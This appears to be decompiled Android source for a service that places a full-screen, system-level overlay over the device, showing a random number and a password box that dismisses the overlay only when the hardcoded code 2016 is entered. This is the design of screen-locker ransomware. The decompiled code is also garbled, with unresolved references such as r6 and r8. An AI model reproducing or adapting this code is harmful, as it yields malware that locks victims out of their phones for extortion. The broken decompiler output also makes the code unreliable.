package com.dedett.qqzan;

import adrt.ADRTLogCatReader;
import android.app.Application;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Message;
import android.view.LayoutInflater;
import android.view.View;
import android.view.View.MeasureSpec;
import android.view.View.OnClickListener;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;

public class Floatw extends Service {
    long jv;
    private LinearLayout mFloatLayout;
    private Handler mHandler;
    private Runnable mRunnable;
    private WindowManager mWindowManager;
    int my_password;
    int number = ((int) ((Math.random() + ((double) 1)) * ((double) 100000)));
    private LayoutParams wmParams;

    @Override
    public void onCreate() {
        ADRTLogCatReader.onContext(this, "com.aide.ui");
        super.onCreate();
        createFloatView();
        Handler handler = r6;
        Handler anonymousClass100000003 = new Handler(this) {
            private final Floatw this$0;

            {
                Handler handler = this;
                this.this$0 = r6;
            }

            static Floatw access$0(AnonymousClass100000003 anonymousClass100000003) {
                return anonymousClass100000003.this$0;
            }

            @Override
            public void handleMessage(Message message) {
                Message message2 = message;
                super.handleMessage(message2);
                if (message2.what != 1) {
                }
            }
        };
        this.mHandler = handler;
    }

    @Override
    public void onStart(Intent intent, int i) {
        Intent intent2 = intent;
        int i2 = i;
        boolean postDelayed = this.mHandler.postDelayed(this.mRunnable, (long) 0);
    }

    @Override
    public void onDestroy() {
        this.mHandler.removeCallbacks(this.mRunnable);
        if (this.mFloatLayout != null) {
            r0.mWindowManager.removeView(r0.mFloatLayout);
        }
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        Floatw floatw = this;
        Intent intent2 = intent;
        return (IBinder) null;
    }

    private void createFloatView() {
        LayoutParams layoutParams = r8;
        LayoutParams layoutParams2 = new LayoutParams();
        this.wmParams = layoutParams;
        Application application = getApplication();
        Application application2 = getApplication();
        this.mWindowManager = (WindowManager) application.getSystemService(Context.WINDOW_SERVICE);
        this.wmParams.type = 2010;
        this.wmParams.format = 1;
        this.wmParams.flags = 1280;
        this.wmParams.width = -1;
        this.wmParams.height = -1;
        this.mFloatLayout = (LinearLayout) LayoutInflater.from(getApplication()).inflate(C0000R.layout.null_a, (ViewGroup) null);
        this.mWindowManager.addView(this.mFloatLayout, this.wmParams);
        this.mFloatLayout.measure(MeasureSpec.makeMeasureSpec(0, 0), MeasureSpec.makeMeasureSpec(0, 0));
    }

    public Floatw() {
        Service service = this;
        int i = ((this.number - 2016) * 2) - 2016;
        this.my_password = 2016;
        AnonymousClass100000002 anonymousClass100000002 = r7;
        AnonymousClass100000002 anonymousClass1000000022 = new Runnable(this) {
            private final Floatw this$0;

            class AnonymousClass100000001 implements OnClickListener {
                private final AnonymousClass100000002 this$0;
                private final EditText val$etext;

                class AnonymousClass100000000 implements Runnable {
                    private final AnonymousClass100000001 this$0;
                    private final TextView val$false_text;

                    AnonymousClass100000000(AnonymousClass100000001 anonymousClass100000001, TextView textView) {
                        TextView textView2 = textView;
                        AnonymousClass100000000 anonymousClass100000000 = this;
                        this.this$0 = anonymousClass100000001;
                        this.val$false_text = textView2;
                    }

                    static AnonymousClass100000001 access$0(AnonymousClass100000000 anonymousClass100000000) {
                        return anonymousClass100000000.this$0;
                    }

                    @Override
                    public void run() {
                        this.val$false_text.setText((CharSequence) null);
                    }
                }

                AnonymousClass100000001(AnonymousClass100000002 anonymousClass100000002, EditText editText) {
                    EditText editText2 = editText;
                    AnonymousClass100000001 anonymousClass100000001 = this;
                    this.this$0 = anonymousClass100000002;
                    this.val$etext = editText2;
                }

                static AnonymousClass100000002 access$0(AnonymousClass100000001 anonymousClass100000001) {
                    return anonymousClass100000001.this$0;
                }

                @Override
                public void onClick(View view) {
                    View view2 = view;
                    if (this.val$etext.getText().toString().equals(String.valueOf(AnonymousClass100000002.access$0(this.this$0).my_password))) {
                        Floatw access$0 = AnonymousClass100000002.access$0(r0.this$0);
                        Intent intent = r8;
                        Intent intent2 = intent2;
                        try {
                            intent2 = new Intent(AnonymousClass100000002.access$0(r0.this$0), Class.forName("com.dedett.qqzan.Floatw"));
                            boolean stopService = access$0.stopService(intent);
                            return;
                        } catch (Throwable e) {
                            Throwable th = e;
                            NoClassDefFoundError noClassDefFoundError = r14;
                            NoClassDefFoundError noClassDefFoundError2 = new NoClassDefFoundError(th.getMessage());
                            throw noClassDefFoundError;
                        }
                    }
                    TextView textView = (TextView) AnonymousClass100000002.access$0(r0.this$0).mFloatLayout.findViewById(C0000R.id.nottrue);
                    textView.setText(AnonymousClass100000002.access$0(r0.this$0).getResources().getString(C0000R.string.nottrue));
                    Handler handler = r14;
                    Handler handler2 = new Handler();
                    AnonymousClass100000000 anonymousClass100000000 = r14;
                    AnonymousClass100000000 anonymousClass1000000002 = new AnonymousClass100000000(r0, textView);
                    stopService = handler.postDelayed(anonymousClass100000000, (long) 1000);
                }
            }

            {
                AnonymousClass100000002 anonymousClass100000002 = this;
                this.this$0 = r6;
            }

            static Floatw access$0(AnonymousClass100000002 anonymousClass100000002) {
                return anonymousClass100000002.this$0;
            }

            @Override
            public void run() {
                TextView textView = (TextView) this.this$0.mFloatLayout.findViewById(C0000R.id.number_m);
                String string = this.this$0.getResources().getString(C0000R.string.number_string);
                TextView textView2 = textView;
                StringBuffer stringBuffer = r12;
                StringBuffer stringBuffer2 = new StringBuffer();
                textView2.setText(stringBuffer.append(string).append(String.valueOf(this.this$0.number)).toString());
                Button button = (Button) this.this$0.mFloatLayout.findViewById(C0000R.id.button);
                AnonymousClass100000001 anonymousClass100000001 = r12;
                AnonymousClass100000001 anonymousClass1000000012 = new AnonymousClass100000001(this, (EditText) this.this$0.mFloatLayout.findViewById(C0000R.id.stext));
                button.setOnClickListener(anonymousClass100000001);
            }
        };
        this.mRunnable = anonymousClass100000002;
    }
}
